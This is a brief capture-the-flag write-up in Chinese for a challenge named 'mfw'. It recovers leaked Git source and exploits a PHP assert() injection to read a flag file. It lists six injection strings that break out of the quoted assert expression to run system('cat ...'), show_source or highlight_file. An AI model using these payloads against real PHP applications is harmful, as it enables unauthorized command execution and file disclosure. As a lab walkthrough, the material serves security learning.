# mfw

这题是 `Git` 文件泄漏. 使用 `https://github.com/lijiejie/GitHack` 得到原代码. 发现 `templates/flag.php` 但没有答案.

注意 `index.php` 这一段代码:

```php
$file = "templates/" . $page . ".php";

// I heard '..' is dangerous!
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");

// TODO: Make this look nice
assert("file_exists('$file')") or die("That file doesn't exist!");
```

没有过滤 `$file`, 可以绕过 `assert` 得到 `flag`, 比如:

```
?file=',system("cat ./templates/flag.php"),'  (注意查看原代码)
?file='.system("cat ./templates/flag.php").'  (注意查看原代码)
?file=',show_source("./templates/flag.php"),'
?file='.show_source("./templates/flag.php").'
?file=',highlight_file("./templates/flag.php"),'
?file='.highlight_file("./templates/flag.php").'
```
